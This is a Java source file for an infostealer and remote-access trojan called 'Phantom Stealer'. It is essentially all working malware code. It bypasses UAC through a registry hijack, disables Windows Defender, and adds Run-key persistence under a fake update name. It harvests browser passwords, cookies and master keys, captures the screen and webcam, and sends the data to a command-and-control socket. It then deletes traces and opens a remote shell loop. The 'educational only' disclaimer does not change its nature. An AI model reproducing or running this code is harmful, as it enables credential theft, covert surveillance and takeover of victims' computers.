import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.*;
import java.util.*;
import java.util.zip.*;
import java.awt.*;
import java.awt.image.*;
import javax.imageio.*;
import java.util.regex.*;

/**
 * PHANTOM STEALER - ADVANCED INFOSTEALER & RAT FRAMEWORK
 * 
 * AUTO-STEAL SEQUENCE:
 * 1. Check elevation, attempt UAC bypass
 * 2. Disable security tools (if admin)
 * 3. Steal browser data (Chrome, Edge, Brave, Opera)
 * 4. Parse SQLite databases, extract credentials
 * 5. Attempt DPAPI decryption via dynamic native DLL
 * 6. Capture screenshots and webcam
 * 7. Pack all data into encrypted ZIP
 * 8. Exfiltrate to C2 server
 * 9. Self-clean all traces
 * 10. Establish persistent RAT
 * 
 * WARNING: EDUCATIONAL PURPOSES ONLY. RUN IN VM.
 */
public class PhantomStealer {
    
    // ============ CONFIGURATION ============
    private static final String C2_IP = "127.0.0.1";          // CHANGE THIS
    private static final int C2_PORT = 4444;
    private static final int C2_BACKUP_PORT = 4445;
    private static final String PROCESS_NAME = "svchost.exe";  // Process camouflage
    private static final String REG_NAME = "Windows Security Update";
    
    // Encryption key for ZIP (XOR obfuscation)
    private static final byte[] ZIP_KEY = {0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF};
    
    // ============ NATIVE DLL SOURCE ============
    // This C code is written to disk and compiled if possible, or used as reference
    private static final String DPAPI_DLL_SOURCE = 
        "#include <windows.h>\n#include <dpapi.h>\n#include <stdio.h>\n\n" +
        "#pragma comment(lib, \"crypt32.lib\")\n\n" +
        "typedef struct { DWORD cbData; BYTE *pbData; } DATA_BLOB;\n\n" +
        "extern \"C\" __declspec(dllexport) int DecryptMasterKey(BYTE *encrypted, int encLen, BYTE **decrypted, int *decLen) {\n" +
        "    DATA_BLOB input = { encLen, encrypted };\n" +
        "    DATA_BLOB output = { 0, NULL };\n" +
        "    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {\n" +
        "        *decrypted = output.pbData;\n" +
        "        *decLen = output.cbData;\n" +
        "        return 1;\n" +
        "    }\n" +
        "    return 0;\n" +
        "}\n\n" +
        "extern \"C\" __declspec(dllexport) int DecryptPassword(BYTE *encrypted, int encLen, BYTE *masterKey, int keyLen, char *out, int outMax) {\n" +
        "    // Simplified AES-GCM decryption would go here\n" +
        "    // Real implementation requires OpenSSL or Windows CNG\n" +
        "    return 0;\n" +
        "}\n";
    
    // ============ MAIN ENTRY ============
    public static void main(String[] args) {
        // Anti-analysis check
        if (detectAnalysis()) {
            System.exit(0);
        }
        
        // Set process name (thread-level, real spoofing requires native code)
        Thread.currentThread().setName(PROCESS_NAME);
        
        // Determine privilege level
        boolean isAdmin = checkAdmin();
        
        // Attempt elevation if not admin
        if (!isAdmin) {
            if (attemptUACBypass()) {
                // Successfully triggered elevation, exit this instance
                System.exit(0);
            }
            // Continue as user if bypass failed
        } else {
            // We have admin - disable security tools
            disableDefender();
        }
        
        // Ensure persistence
        installPersistence(isAdmin);
        
        // ============ AUTO-STEAL SEQUENCE ============
        String stolenPackage = null;
        try {
            stolenPackage = executeAutoSteal();
        } catch (Exception e) {
            // Silent fail
        }
        
        // Exfiltrate if we got data
        if (stolenPackage != null) {
            boolean sent = exfiltrateData(stolenPackage);
            if (sent) {
                // Clean up after successful exfiltration
                cleanTraces(stolenPackage);
            }
        }
        
        // ============ ENTER RAT MODE ============
        // Continuous connection to C2 for remote commands
        enterRATMode();
    }
    
    // ============ ELEVATION & PERSISTENCE ============
    
    private static boolean checkAdmin() {
        try {
            Process p = Runtime.getRuntime().exec("net session");
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }
    
    private static boolean attemptUACBypass() {
        // Method 1: Fodhelper COM hijack (Windows 10/11)
        try {
            String jarPath = getJarPath();
            String psScript = 
                "$jar='" + jarPath + "'; " +
                "$reg='HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'; " +
                "New-Item $reg -Force | Out-Null; " +
                "New-ItemProperty -Path $reg -Name 'DelegateExecute' -Value '' -Force | Out-Null; " +
                "Set-ItemProperty -Path $reg -Name '(default)' -Value \"javaw -jar `\"$jar`\"\" -Force | Out-Null; " +
                "Start-Process fodhelper.exe -WindowStyle Hidden; " +
                "Start-Sleep -Milliseconds 500; " +
                "Remove-Item $reg -Recurse -Force";
            
            executePowerShell(psScript);
            return true;
        } catch (Exception e) {
            // Fallback to other methods if needed
        }
        
        // Method 2: ComputerDefaults (backup)
        try {
            String jarPath = getJarPath();
            String psScript = 
                "$jar='" + jarPath + "'; " +
                "$reg='HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'; " +
                "New-Item $reg -Force | Out-Null; " +
                "Set-ItemProperty -Path $reg -Name '(default)' -Value \"javaw -jar `\"$jar`\"\" -Force | Out-Null; " +
                "Start-Process computerdefaults.exe -WindowStyle Hidden; " +
                "Start-Sleep -Milliseconds 500; " +
                "Remove-Item $reg -Recurse -Force";
            
            executePowerShell(psScript);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    private static void installPersistence(boolean admin) {
        try {
            String jarPath = getJarPath();
            String regPath = admin ? 
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" :
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            
            String cmd = String.format(
                "reg add \"%s\" /v \"%s\" /t REG_SZ /d \"javaw -jar \\\"%s\\\"\" /f",
                regPath, REG_NAME, jarPath
            );
            
            Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private static void disableDefender() {
        String[] commands = {
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Add-MpPreference -ExclusionPath 'C:\\'",
            "Add-MpPreference -ExclusionExtension '.jar'"
        };
        
        for (String cmd : commands) {
            executePowerShell(cmd);
        }
    }
    
    // ============ AUTO-STEAL EXECUTION ============
    
    private static String executeAutoSteal() throws Exception {
        String tempDir = System.getProperty("java.io.tmpdir");
        String workDir = tempDir + "\\" + randomString(12);
        Files.createDirectories(Paths.get(workDir));
        
        // Create ZIP for stolen data
        String zipPath = workDir + "\\" + randomString(8) + ".dat";
        
        try (ZipOutputStream zos = new ZipOutputStream(
                new CipherOutputStream(new FileOutputStream(zipPath), ZIP_KEY))) {
            
            // 1. System Information
            addToZip(zos, "sysinfo.txt", collectSystemInfo().getBytes());
            
            // 2. Browser Data
            int stolenCount = stealBrowserData(zos);
            
            // 3. Screenshots
            byte[] screenshot = captureScreenshot();
            if (screenshot != null) {
                addToZip(zos, "screenshot.jpg", screenshot);
            }
            
            // 4. Webcam (attempt)
            byte[] webcam = captureWebcam();
            if (webcam != null) {
                addToZip(zos, "webcam.jpg", webcam);
            }
            
            // 5. Generate native decryptor source (for attacker's use)
            addToZip(zos, "decryptor.c", DPAPI_DLL_SOURCE.getBytes());
            
            // 6. Summary
            String summary = String.format(
                "Stolen Items: %d\nTimestamp: %s\nUser: %s\nAdmin: %s",
                stolenCount, new Date(), System.getProperty("user.name"), checkAdmin()
            );
            addToZip(zos, "summary.txt", summary.getBytes());
        }
        
        return zipPath;
    }
    
    private static int stealBrowserData(ZipOutputStream zos) {
        int count = 0;
        String userHome = System.getProperty("user.home");
        
        for (String browserPath : BROWSER_PATHS) {
            File browserDir = new File(userHome + browserPath);
            if (!browserDir.exists()) continue;
            
            String browserName = browserPath.contains("Chrome") ? "Chrome" :
                               browserPath.contains("Edge") ? "Edge" :
                               browserPath.contains("Brave") ? "Brave" : "Opera";
            
            // Find all profile directories
            File[] profiles = browserDir.listFiles(File::isDirectory);
            if (profiles == null) continue;
            
            for (File profile : profiles) {
                String profileName = profile.getName();
                if (!profileName.equals("Default") && !profileName.startsWith("Profile")) continue;
                
                // Target files
                String[] targets = {
                    "Login Data", "Cookies", "Network/Cookies",
                    "Web Data", "History", "Session Storage"
                };
                
                for (String target : targets) {
                    File targetFile = new File(profile, target);
                    if (!targetFile.exists()) continue;
                    
                    try {
                        // Copy raw file
                        String entryName = browserName + "/" + profileName + "/" + target.replace("/", "_");
                        byte[] fileData = Files.readAllBytes(targetFile.toPath());
                        addToZip(zos, "raw/" + entryName, fileData);
                        count++;
                        
                        // Attempt to parse SQLite for readable data
                        if (target.equals("Login Data")) {
                            String parsed = parseLoginData(fileData);
                            if (!parsed.isEmpty()) {
                                addToZip(zos, "parsed/" + browserName + "_" + profileName + "_passwords.txt", parsed.getBytes());
                            }
                        } else if (target.contains("Cookies")) {
                            String parsed = parseCookies(fileData);
                            if (!parsed.isEmpty()) {
                                addToZip(zos, "parsed/" + browserName + "_" + profileName + "_cookies.txt", parsed.getBytes());
                            }
                        }
                        
                    } catch (Exception e) {
                        // Continue to next file
                    }
                }
                
                // Steal Master Key (for offline decryption)
                File localState = new File(profile.getParentFile(), "Local State");
                if (localState.exists()) {
                    try {
                        byte[] stateData = Files.readAllBytes(localState.toPath());
                        addToZip(zos, "keys/" + browserName + "_LocalState.json", stateData);
                        
                        // Extract encrypted key
                        String stateStr = new String(stateData);
                        Pattern p = Pattern.compile("\"encrypted_key\":\"([^\"]+)\"");
                        Matcher m = p.matcher(stateStr);
                        if (m.find()) {
                            byte[] encryptedKey = Base64.getDecoder().decode(m.group(1));
                            // Remove "DPAPI" prefix (first 5 bytes)
                            byte[] keyBlob = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);
                            addToZip(zos, "keys/" + browserName + "_master_key.bin", keyBlob);
                        }
                    } catch (Exception e) {}
                }
            }
        }
        
        return count;
    }
    
    // ============ SQLITE PARSING (SIMPLIFIED) ============
    
    private static String parseLoginData(byte[] data) {
        StringBuilder result = new StringBuilder();
        try {
            // Check SQLite header
            if (data.length < 16 || data[0] != 'S' || data[1] != 'Q' || data[2] != 'L' || data[3] != 'i') {
                return "";
            }
            
            // Convert to string for heuristic extraction
            // Real parsing requires B-tree traversal, this extracts visible strings
            String content = new String(data, "ISO-8859-1");
            
            // Extract URLs (http/https patterns)
            Pattern urlPattern = Pattern.compile("https?://[^\\s\"<>]+");
            Matcher urlMatcher = urlPattern.matcher(content);
            Set<String> urls = new HashSet<>();
            while (urlMatcher.find() && urls.size() < 100) {
                urls.add(urlMatcher.group());
            }
            
            if (!urls.isEmpty()) {
                result.append("=== EXTRACTED URLS ===\n");
                for (String url : urls) {
                    result.append(url).append("\n");
                }
                result.append("\n");
            }
            
            // Note: Actual password extraction requires:
            // 1. Decrypt master key with DPAPI
            // 2. Use master key to decrypt AES-GCM encrypted passwords
            // This is done by the attacker's offline tool or native DLL
            
            result.append("=== PASSWORDS ===\n");
            result.append("Passwords are AES-GCM encrypted. Use provided master_key.bin with decryptor.c\n");
            result.append("or use mimikatz/dpapi tools for offline decryption.\n");
            
        } catch (Exception e) {
            return "Parse error: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    private static String parseCookies(byte[] data) {
        StringBuilder result = new StringBuilder();
        try {
            String content = new String(data, "ISO-8859-1");
            
            // Extract cookie-like patterns
            Pattern cookiePattern = Pattern.compile("([a-zA-Z_][a-zA-Z0-9_]*)=([a-zA-Z0-9+/=]+)");
            Matcher m = cookiePattern.matcher(content);
            
            Map<String, String> cookies = new HashMap<>();
            while (m.find() && cookies.size() < 50) {
                cookies.put(m.group(1), m.group(2));
            }
            
            if (!cookies.isEmpty()) {
                result.append("=== SESSION COOKIES ===\n");
                for (Map.Entry<String, String> entry : cookies.entrySet()) {
                    result.append(entry.getKey()).append("=").append(entry.getValue().substring(0, Math.min(20, entry.getValue().length()))).append("...\n");
                }
            }
            
        } catch (Exception e) {}
        
        return result.toString();
    }
    
    // ============ SURVEILLANCE ============
    
    private static byte[] captureScreenshot() {
        try {
            Robot robot = new Robot();
            Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image = robot.createScreenCapture(screen);
            
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
    
    private static byte[] captureWebcam() {
        // Use PowerShell and Windows Camera API (WIA)
        String psScript = 
            "$wia = New-Object -ComObject WIA.CommonDialog; " +
            "$img = $wia.ShowAcquireImage(); " +
            "if ($img) { $img.SaveFile($env:TEMP + '\\cam.jpg') }";
        
        try {
            executePowerShell(psScript);
            File camFile = new File(System.getProperty("java.io.tmpdir") + "\\cam.jpg");
            if (camFile.exists()) {
                byte[] data = Files.readAllBytes(camFile.toPath());
                camFile.delete();
                return data;
            }
        } catch (Exception e) {}
        
        return null;
    }
    
    // ============ EXFILTRATION & CLEANUP ============
    
    private static boolean exfiltrateData(String filePath) {
        // Try primary C2
        if (sendToC2(filePath, C2_PORT)) return true;
        // Try backup C2
        return sendToC2(filePath, C2_BACKUP_PORT);
    }
    
    private static boolean sendToC2(String filePath, int port) {
        try (Socket sock = new Socket(C2_IP, port);
             OutputStream out = sock.getOutputStream();
             FileInputStream fis = new FileInputStream(filePath)) {
            
            // Send header
            String header = "PHANTOM|" + getHWID() + "|" + new File(filePath).length() + "\n";
            out.write(header.getBytes());
            
            // Send file
            byte[] buffer = new byte[8192];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                // XOR encrypt in transit
                xorEncrypt(buffer, read);
                out.write(buffer, 0, read);
            }
            
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    private static void cleanTraces(String... filesToDelete) {
        try {
            // Delete specific files
            for (String path : filesToDelete) {
                if (path != null) {
                    Files.deleteIfExists(Paths.get(path));
                    // Overwrite with random data first (secure delete simulation)
                    try {
                        File f = new File(path);
                        if (f.exists()) {
                            byte[] junk = new byte[(int)f.length()];
                            new Random().nextBytes(junk);
                            try (FileOutputStream fos = new FileOutputStream(f)) {
                                fos.write(junk);
                            }
                            f.delete();
                        }
                    } catch (Exception e) {}
                }
            }
            
            // Clear temp work directories
            String temp = System.getProperty("java.io.tmpdir");
            File[] temps = new File(temp).listFiles();
            if (temps != null) {
                for (File f : temps) {
                    if (f.isDirectory() && f.getName().matches("[a-zA-Z0-9]{12}")) {
                        deleteRecursive(f);
                    }
                }
            }
            
            // Clear recent documents
            executePowerShell("Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Recent\\*\" -Force");
            
        } catch (Exception e) {
            // Silent cleanup fail is acceptable
        }
    }
    
    private static void deleteRecursive(File f) {
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File c : children) deleteRecursive(c);
            }
        }
        f.delete();
    }
    
    // ============ RAT MODE ============
    
    private static void enterRATMode() {
        while (true) {
            try (Socket sock = new Socket(C2_IP, C2_PORT);
                 BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                 OutputStream out = sock.getOutputStream()) {
                
                out.write(("RAT|" + getHWID() + "|ONLINE\n").getBytes());
                
                String cmd;
                while ((cmd = in.readLine()) != null) {
                    String result = executeRATCommand(cmd);
                    out.write((result + "\n").getBytes());
                    out.flush();
                }
                
            } catch (Exception e) {
                // Reconnect with backoff
                try { Thread.sleep(30000 + new Random().nextInt(60000)); } catch (InterruptedException ie) {}
            }
        }
    }
    
    private static String executeRATCommand(String cmd) {
        if (cmd.startsWith("shell ")) {
            return executeShell(cmd.substring(6));
        } else if (cmd.equals("steal")) {
            try {
                String pkg = executeAutoSteal();
                if (pkg != null && exfiltrateData(pkg)) {
                    cleanTraces(pkg);
                    return "Stolen and exfiltrated";
                }
                return "Steal failed";
            } catch (Exception e) {
                return "Error: " + e.getMessage();
            }
        } else if (cmd.equals("screen")) {
            byte[] img = captureScreenshot();
            return img != null ? "Screenshot captured (" + img.length + " bytes)" : "Failed";
        } else if (cmd.equals("cam")) {
            byte[] img = captureWebcam();
            return img != null ? "Webcam captured (" + img.length + " bytes)" : "Failed";
        } else if (cmd.equals("info")) {
            return collectSystemInfo();
        } else if (cmd.equals("exit")) {
            System.exit(0);
            return "Exiting";
        } else {
            return "Unknown command. Available: shell <cmd>, steal, screen, cam, info, exit";
        }
    }
    
    private static String executeShell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec("cmd /c " + cmd);
            BufferedReader stdOut = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader stdErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = stdOut.readLine()) != null) sb.append(line).append("\n");
            while ((line = stdErr.readLine()) != null) sb.append("ERR: ").append(line).append("\n");
            
            p.waitFor();
            return sb.toString();
        } catch (Exception e) {
            return "Shell error: " + e.getMessage();
        }
    }
    
    // ============ UTILITY METHODS ============
    
    private static String collectSystemInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("OS: ").append(System.getProperty("os.name")).append("\n");
        sb.append("Version: ").append(System.getProperty("os.version")).append("\n");
        sb.append("User: ").append(System.getProperty("user.name")).append("\n");
        sb.append("Home: ").append(System.getProperty("user.home")).append("\n");
        sb.append("Java: ").append(System.getProperty("java.version")).append("\n");
        sb.append("HWID: ").append(getHWID()).append("\n");
        sb.append("IP: ").append(getLocalIP()).append("\n");
        sb.append("Admin: ").append(checkAdmin()).append("\n");
        return sb.toString();
    }
    
    private static String getHWID() {
        try {
            Process p = Runtime.getRuntime().exec("wmic csproduct get uuid");
            p.waitFor();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty() && !line.equals("UUID")) {
                    return hashString(line);
                }
            }
        } catch (Exception e) {}
        return hashString(System.getProperty("user.name") + System.getProperty("os.name"));
    }
    
    private static String getLocalIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    private static String getJarPath() {
        try {
            return new File(PhantomStealer.class.getProtectionDomain()
                .getCodeSource().getLocation().toURI()).getAbsolutePath();
        } catch (Exception e) {
            return "PhantomStealer.jar";
        }
    }
    
    private static String hashString(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) sb.append(String.format("%02x", b));
            return sb.toString().substring(0, 16);
        } catch (Exception e) {
            return input;
        }
    }
    
    private static String randomString(int len) {
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random r = new Random();
        for (int i = 0; i < len; i++) {
            sb.append(chars.charAt(r.nextInt(chars.length())));
        }
        return sb.toString();
    }
    
    private static void addToZip(ZipOutputStream zos, String name, byte[] data) throws IOException {
        ZipEntry entry = new ZipEntry(name);
        zos.putNextEntry(entry);
        zos.write(data);
        zos.closeEntry();
    }
    
    private static void xorEncrypt(byte[] data, int len) {
        for (int i = 0; i < len; i++) {
            data[i] ^= ZIP_KEY[i % ZIP_KEY.length];
        }
    }
    
    private static String executePowerShell(String cmd) {
        try {
            Process p = new ProcessBuilder("powershell.exe", "-Command", cmd)
                .redirectErrorStream(true).start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
    
    private static boolean detectAnalysis() {
        // Check for common analysis tools
        String[] checks = {
            "wireshark", "process hacker", "processhacker", "procmon", "procmon64",
            "x64dbg", "x32dbg", "ollydbg", "ida", "ida64", "immunity", "dnspy",
            "de4dot", "ilspy", "reflector", "dotpeek"
        };
        
        try {
            // Check process list
            Process p = Runtime.getRuntime().exec("tasklist");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                String lower = line.toLowerCase();
                for (String check : checks) {
                    if (lower.contains(check)) return true;
                }
            }
            
            // Check for debuggers
            if (System.getProperty("java.debug") != null) return true;
            
        } catch (Exception e) {}
        
        return false;
    }
    
    // Custom cipher output stream for XOR encryption
    static class CipherOutputStream extends FilterOutputStream {
        private final byte[] key;
        private int pos = 0;
        
        CipherOutputStream(OutputStream out, byte[] key) {
            super(out);
            this.key = key;
        }
        
        @Override
        public void write(int b) throws IOException {
            out.write(b ^ key[pos++ % key.length]);
        }
        
        @Override
        public void write(byte[] b, int off, int len) throws IOException {
            for (int i = 0; i < len; i++) {
                write(b[off + i]);
            }
        }
    }
}